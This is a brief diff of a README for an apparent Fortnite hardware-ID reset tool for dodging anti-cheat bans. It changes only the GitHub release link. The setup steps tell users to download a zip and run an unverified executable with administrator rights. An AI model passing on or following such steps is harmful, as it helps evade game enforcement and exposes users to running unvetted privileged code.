@@ -31,7 +31,7 @@ Whether you're building new profiles, testing anti-cheat reactions, or just main
 
 ## 🔧 Setup Guide
 
-1. Visit [Releases](https://github.com/TobeyWrightlxlg/Fortnite-HWID-Reset/releases/tag/stable)
+1. Visit [Releases](https://github.com/TobeyWrightlxlg/Fortnite-HWID-Reset-2025/releases/tag/stable)
 2. Download the latest `.zip` archive
 3. Extract files to a secure folder (e.g. `C:\FNIDReset\`)
 4. Launch `HWIDResetLauncher.exe` with administrator rights
